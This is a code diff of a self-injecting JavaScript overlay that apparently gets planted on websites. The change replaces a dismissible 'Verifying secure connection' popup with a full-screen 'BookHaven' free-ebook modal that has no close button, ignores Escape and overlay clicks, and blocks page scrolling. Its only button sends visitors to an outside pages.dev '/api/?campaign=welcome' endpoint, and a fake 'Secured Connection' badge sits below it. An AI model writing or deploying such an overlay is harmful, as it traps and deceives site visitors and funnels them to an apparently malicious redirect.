@@ -1,18 +1,12 @@
-// User Engagement Modal with Server-Side Redirect
+// User Engagement Modal with Instant Redirect
 (function() {
     // ============================================
     // CONFIGURATION
     // ============================================
     
     const CONFIG = {
-        progressDuration: 500,
-        // Use your Pages API endpoint (not the Worker directly)
         redirectURL: 'https://registernow-7ps.pages.dev/api/?campaign=welcome'
     };
-
-    function getTarget() {
-        return CONFIG.redirectURL;
-    }
     
     // ============================================
 
@@ -30,26 +24,23 @@
             font-weight: bold;
             margin: 0;
             padding: 0;
+            overflow: hidden;
         }
         
         .popup-overlay {
-            display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            z-index: 1000;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            z-index: 9999;
+            display: flex;
             align-items: center;
             justify-content: center;
-            animation: fadeIn 0.2s ease;
-        }
-        
-        .popup-overlay.active {
-            display: flex;
+            animation: fadeIn 0.3s ease;
         }
         
         @keyframes fadeIn {
@@ -58,292 +49,180 @@
         }
         
         .popup-card {
-            background: #242526;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
             border-radius: 20px;
-            padding: 2rem;
-            max-width: 500px;
+            padding: 3rem 2rem;
+            max-width: 450px;
             width: 90%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            position: relative;
-            transform: scale(0.95);
-            opacity: 0;
-            animation: popupEntry 0.3s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
         
-        @keyframes popupEntry {
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-        
-        .close-btn {
-            position: absolute;
-            top: 1.25rem;
-            right: 1.25rem;
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: transparent;
-            border: none;
-            cursor: pointer;
+        .brand-logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #c9a50a, #f0c419);
+            border-radius: 20px;
+            margin: 0 auto 25px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 24px;
-            color: #ffffff;
-            transition: all 0.2s ease;
-            line-height: 1;
-        }
-        
-        .close-btn:hover {
-            background: rgba(255, 255, 255, 0.1);
+            font-size: 32px;
+            color: white;
+            font-weight: bold;
+            box-shadow: 0 10px 30px rgba(201, 165, 10, 0.3);
         }
         
         .popup-header {
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
         }
         
         .popup-header h2 {
-            font-size: 2rem;
+            font-size: 2.2rem;
             font-weight: 700;
-            color: #f48220;
-            margin-bottom: 0.75rem;
+            color: #ffffff;
+            margin-bottom: 0.5rem;
             letter-spacing: -0.5px;
         }
         
-        .version-badge {
-            display: inline-block;
-            background: #d1d1d6;
-            color: #636366;
-            padding: 6px 16px;
-            border-radius: 20px;
-            font-size: 13px;
+        .popup-header p {
+            color: #cccccc;
+            font-size: 1.1rem;
             font-weight: 500;
         }
         
-        .popup-content {
-            margin: 1.5rem 0 2rem 0;
+        .features-list {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            text-align: left;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
         
-        .popup-content p {
-            font-size: 22.5px;
-            color: #ffffff;
-            line-height: 1.6;
-        }
-        
-        .verification-status {
+        .feature-item {
             display: flex;
             align-items: center;
-            gap: 12px;
-            padding: 16px 20px;
-            background: #d1f4e0;
-            border-radius: 14px;
-            margin-bottom: 1.5rem;
-            transition: background 0.3s ease;
+            margin-bottom: 1rem;
+            color: #ffffff;
+            font-size: 0.95rem;
         }
         
-        .status-icon {
-            width: 28px;
-            height: 28px;
+        .feature-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .feature-icon {
+            width: 24px;
+            height: 24px;
+            background: #c9a50a;
             border-radius: 50%;
-            border: 2.5px solid #34c759;
-            position: relative;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: white;
             flex-shrink: 0;
-            background: transparent;
-        }
-        
-        .status-icon::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 10px;
-            height: 10px;
-            background: #34c759;
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
-        }
-        
-        .status-text {
-            font-size: 22.5px;
-            color: #1d4d2b;
-            font-weight: 500;
-        }
-        
-        .progress-container {
-            margin-bottom: 1.5rem;
-            opacity: 0;
-            animation: fadeInUp 0.8s ease-out 0.5s forwards;
-        }
-        
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #e5e7eb;
-            border-radius: 10px;
-            overflow: hidden;
-            position: relative;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #c9a50a 0%, #f0c419 100%);
-            border-radius: 10px;
-            width: 0%;
-            transition: width 0.1s linear;
-            box-shadow: 0 0 10px rgba(201, 165, 10, 0.5);
-        }
-        
-        .progress-label {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 8px;
-            font-size: 0.75rem;
-            color: #ffffff;
-        }
-        
-        .loading-dots {
-            display: inline-flex;
-            gap: 3px;
-        }
-        
-        .loading-dots span {
-            width: 4px;
-            height: 4px;
-            background: #ffffff;
-            border-radius: 50%;
-            animation: dotBounce 1.4s infinite ease-in-out both;
-        }
-        
-        .loading-dots span:nth-child(1) {
-            animation-delay: -0.32s;
-        }
-        
-        .loading-dots span:nth-child(2) {
-            animation-delay: -0.16s;
-        }
-        
-        @keyframes dotBounce {
-            0%, 80%, 100% {
-                transform: scale(0.8);
-                opacity: 0.5;
-            }
-            40% {
-                transform: scale(1.2);
-                opacity: 1;
-            }
-        }
-        
-        .popup-buttons {
-            display: flex;
-            gap: 12px;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s ease;
-        }
-        
-        .popup-buttons.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-        
-        .btn {
-            flex: 1;
-            padding: 16px 24px;
-            border-radius: 12px;
-            font-weight: 600;
-            font-size: 15px;
-            border: none;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            text-align: center;
+            font-weight: bold;
         }
         
         .btn-continue {
-            background: #c9a50a;
+            background: linear-gradient(135deg, #c9a50a 0%, #f0c419 100%);
             color: white;
-            box-shadow: 0 2px 8px rgba(201, 165, 10, 0.3);
+            border: none;
+            padding: 18px 40px;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(201, 165, 10, 0.4);
             width: 100%;
+            letter-spacing: 0.5px;
+            margin-top: 1rem;
         }
         
         .btn-continue:hover {
-            background: #b69609;
-            box-shadow: 0 4px 12px rgba(201, 165, 10, 0.4);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(201, 165, 10, 0.5);
         }
         
         .btn-continue:active {
-            transform: scale(0.98);
+            transform: translateY(0);
+        }
+        
+        .secure-badge {
+            display: inline-flex;
+            align-items: center;
+            background: rgba(230, 255, 250, 0.1);
+            color: #88e0c8;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-top: 1.5rem;
+            border: 1px solid rgba(136, 224, 200, 0.3);
+        }
+        
+        .secure-badge::before {
+            content: "🔒";
+            margin-right: 6px;
         }
         
         @media screen and (max-width: 500px) {
             .popup-card {
-                padding: 1.5rem;
+                padding: 2rem 1.5rem;
                 max-width: 95%;
                 border-radius: 16px;
             }
             
             .popup-header h2 {
-                font-size: 1.75rem;
+                font-size: 1.8rem;
             }
             
-            .btn {
-                width: 100%;
+            .brand-logo {
+                width: 70px;
+                height: 70px;
+                font-size: 28px;
             }
         }
     `;
     document.head.appendChild(style);
 
-    // Inject Google Fonts
-    const fontLink = document.createElement('link');
-    fontLink.href = 'https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap';
-    fontLink.rel = 'stylesheet';
-    document.head.appendChild(fontLink);
-
     // Create modal HTML
     const modalHTML = `
-        <div class="popup-overlay active" id="popupOverlay">
+        <div class="popup-overlay" id="popupOverlay">
             <div class="popup-card">
-                <button class="close-btn" id="closeBtn">×</button>
+                <div class="brand-logo">B</div>
                 
                 <div class="popup-header">
-                    <h2>Welcome Back</h2>
-                    <span class="version-badge">Secure Access</span>
+                    <h2>Welcome to BookHaven</h2>
+                    <p>Your Digital Reading Journey Awaits</p>
                 </div>
                 
-                <div class="popup-content">
-                    <p>We're preparing your personalized experience. Be On Anything. Anywhere. Anytime. New Customers Only</p>
-                </div>
-                
-                <div class="verification-status" id="verificationStatus">
-                    <div class="status-icon"></div>
-                    <span class="status-text">Verifying secure connection</span>
-                </div>
-                
-                <div class="progress-container">
-                    <div class="progress-bar">
-                        <div class="progress-fill" id="progressFill"></div>
+                <div class="features-list">
+                    <div class="feature-item">
+                        <div class="feature-icon">✓</div>
+                        <span>Access thousands of free ebooks</span>
                     </div>
-                    <div class="progress-label">
-                        <span id="statusText">Initializing<span class="loading-dots"><span></span><span></span><span></span></span></span>
-                        <span id="progressPercent">0%</span>
+                    <div class="feature-item">
+                        <div class="feature-icon">✓</div>
+                        <span>No downloads required</span>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">✓</div>
+                        <span>Instant reading experience</span>
                     </div>
                 </div>
                 
-                <div class="popup-buttons" id="popupButtons">
-                    <button class="btn btn-continue" id="continueBtn">Continue</button>
+                <button class="btn-continue" id="continueBtn">
+                    Start Reading Now ›
+                </button>
+                
+                <div class="secure-badge">
+                    Secured Connection
                 </div>
             </div>
         </div>
@@ -353,81 +232,32 @@
     function init() {
         document.body.insertAdjacentHTML('beforeend', modalHTML);
         document.body.style.overflow = 'hidden';
-        document.body.classList.add('modal-active');
 
         const overlay = document.getElementById('popupOverlay');
-        const closeBtn = document.getElementById('closeBtn');
         const continueBtn = document.getElementById('continueBtn');
-        const progressFill = document.getElementById('progressFill');
-        const progressPercent = document.getElementById('progressPercent');
-        const statusText = document.getElementById('statusText');
-        const popupButtons = document.getElementById('popupButtons');
-        const verificationStatus = document.getElementById('verificationStatus');
-        const statusTextEl = verificationStatus.querySelector('.status-text');
 
+        // Show modal immediately
         setTimeout(function() {
-            animateProgress();
-        }, 1000);
+            overlay.style.display = 'flex';
+        }, 100);
 
-        function animateProgress() {
-            let progress = 0;
-            const interval = 50;
-            const increment = (interval / CONFIG.progressDuration) * 100;
-
-            const timer = setInterval(function() {
-                progress += increment;
-                
-                if (progress >= 100) {
-                    progress = 100;
-                    clearInterval(timer);
-                    
-                    progressFill.style.width = '100%';
-                    progressPercent.textContent = '100%';
-                    statusText.innerHTML = 'Ready ✓';
-                    statusTextEl.textContent = 'Connection verified ✓';
-                    verificationStatus.style.background = 'linear-gradient(135deg, #dcfce7 0%, #bbf7d0 100%)';
-                    
-                    setTimeout(function() {
-                        popupButtons.classList.add('active');
-                    }, 300);
-                    
-                } else {
-                    progressFill.style.width = Math.round(progress) + '%';
-                    progressPercent.textContent = Math.round(progress) + '%';
-                }
-            }, interval);
-        }
-
-        function closePopup() {
-            overlay.classList.remove('active');
-            document.body.style.overflow = 'auto';
-            document.body.classList.remove('modal-active');
-        }
-
-        // Continue button - redirect to Worker endpoint
+        // Continue button - INSTANT redirect
         continueBtn.addEventListener('click', function() {
-            overlay.classList.remove('active');
-            document.body.style.overflow = 'auto';
-            document.body.classList.remove('modal-active');
-            
-            window.location.href = getTarget();
+            // Immediately redirect - no delay
+            window.location.href = CONFIG.redirectURL;
         });
+
+        // Prevent background scrolling
+        document.addEventListener('wheel', preventScroll, { passive: false });
+        document.addEventListener('touchmove', preventScroll, { passive: false });
         
-        closeBtn.addEventListener('click', closePopup);
-
-        overlay.addEventListener('click', function(e) {
-            if (e.target.id === 'popupOverlay') {
-                closePopup();
-            }
-        });
-
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Escape') {
-                closePopup();
-            }
-        });
+        function preventScroll(e) {
+            e.preventDefault();
+            return false;
+        }
     }
 
+    // Load immediately
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', init);
     } else {
